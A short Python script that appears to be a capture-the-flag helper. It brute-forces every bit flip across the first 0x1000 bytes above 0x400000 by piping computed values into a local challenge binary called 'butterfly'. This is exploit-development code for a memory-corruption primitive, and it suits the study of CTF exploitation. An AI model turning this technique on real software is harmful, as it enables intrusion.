#!/usr/bin/env python

import os

for offset in range(0, 0x1000):
    addr = 0x400000 + offset
    for flip in range(0, 8):
        payload = str(addr * 8 + flip)
        print('payload: ' + payload)
        print('addr: ' + hex(addr))
        print('bit: ' + hex(flip))
        os.system('echo ' + payload + ' | ./butterfly_33e86bcc2f0a21d57970dc6907867bed')
        print
